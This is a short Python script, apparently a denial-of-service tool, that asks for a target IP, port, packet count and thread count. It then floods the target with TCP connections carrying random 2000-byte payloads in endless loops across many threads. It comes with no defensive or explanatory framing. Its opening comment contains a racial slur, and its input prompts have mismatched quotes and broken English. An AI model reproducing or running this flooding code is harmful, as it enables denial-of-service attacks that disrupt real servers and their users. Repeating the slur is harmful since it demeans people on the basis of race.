#Fuck Nigga # Simple Tool Script

import socket,random,threading

ip = str(input('[√] Target: "))
port = int(input('[√] Port: "))
pack = int(input("[√] Packet: "))
thread = int(input("[√]Trenking: "))


def start():
    hh = random._urandom(2000)
    xx = int(0)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(hh)
            for i in range(pack):
                s.send(hh)
            xx += 1
            print("Start")
        except:    
            s.close()
            print("Can I Sent Pakets Sent to ip")
for x in range(thread):
    thred = threading.Thread(target=start)
    thred.start()
  
  
  

